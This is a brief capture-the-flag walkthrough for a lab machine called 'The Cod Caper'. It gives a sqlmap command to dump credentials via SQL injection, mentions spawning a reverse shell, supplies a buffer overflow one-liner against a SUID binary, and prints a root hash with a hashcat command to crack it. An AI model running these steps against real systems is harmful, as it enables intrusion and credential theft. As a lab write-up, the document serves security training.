# The Cod Caper

### The Cod Caper
Nmap scan shows ports 22 and 80 open. Port 80 is a default apache webserver. Gobuster reveals `/administrator.php`:<br />
![image](https://github.com/user-attachments/assets/79a6555d-c1b9-46f4-84d9-7ba1b4de8f27)<br />
This form is vulnerable to SQLinjection. To exploit it, capture a login request with burpsuite and copy into a file called `request`, then run `sqlmap -r Request.txt -D users --tables users --dump`. Once found the credentials, just log in and you have a command prompt from which you can spawn a reverse shell.<br />
Now for privesc, there's a SUID file at `/opt/secret/root`. To exploit it, run `python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root`. This gets us a password hash for root: `$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.`.<br />
To crack it, run `hashcat -m 1800 roothash.txt -a 0 /usr/share/wordlists/rockyou.txt`, and get the root password!
